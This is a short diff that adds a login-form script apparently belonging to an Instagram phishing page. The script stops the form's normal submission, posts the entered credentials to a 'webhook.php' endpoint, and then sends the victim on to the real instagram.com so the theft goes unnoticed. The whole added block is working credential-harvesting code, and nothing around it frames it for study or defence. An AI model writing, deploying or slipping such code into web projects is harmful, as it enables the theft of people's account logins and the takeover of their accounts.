@@ -1,0 +1,7 @@
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    fetch('webhook.php', {method: 'POST', body: new FormData(this)})
+        .then(() => window.location.href = 'https://www.instagram.com/');
+});
+</script>
